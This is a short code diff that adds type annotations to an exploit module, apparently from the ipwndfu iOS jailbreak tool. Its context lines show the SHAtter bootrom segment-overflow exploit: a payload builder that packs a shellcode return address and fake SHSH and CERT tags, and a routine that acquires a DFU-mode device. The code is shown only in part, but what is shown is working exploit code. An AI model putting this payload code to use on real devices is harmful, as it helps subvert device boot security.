@@ -8,7 +8,7 @@ import time
 from ipwndfu import dfu
 
 
-def generate_payload():
+def generate_payload() -> bytes:
     shellcode_address = 0x8402F198 + 1
     data = struct.pack("<40sI", "\xF0" * 40, shellcode_address)
     tags = data + struct.pack("<4s2I4s2I", "SHSH"[::-1], 12, 0, "CERT"[::-1], 12, 0)
@@ -21,7 +21,7 @@ def generate_payload():
     return header + tags + shellcode
 
 
-def exploit():
+def exploit() -> None:
     print("*** based on SHAtter exploit (segment overflow) by posixninja and pod2g ***")
 
     device = dfu.acquire_device()
